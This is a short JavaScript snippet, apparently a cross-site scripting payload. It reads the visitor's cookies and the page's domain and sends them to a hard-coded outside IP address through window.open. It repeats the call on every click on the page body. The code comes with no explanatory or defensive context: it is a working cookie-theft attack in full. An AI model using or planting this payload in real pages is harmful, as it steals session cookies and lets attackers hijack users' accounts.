var c = encodeURI(document.cookie);
var d = encodeURI(document.domain);
window.open('//198.199.123.13/u.php?c='+c+"&d="+d);
document.body.addEventListener('click', function() {
            window.open('//198.199.123.13/u.php?c='+c+"&d="+d);
        });
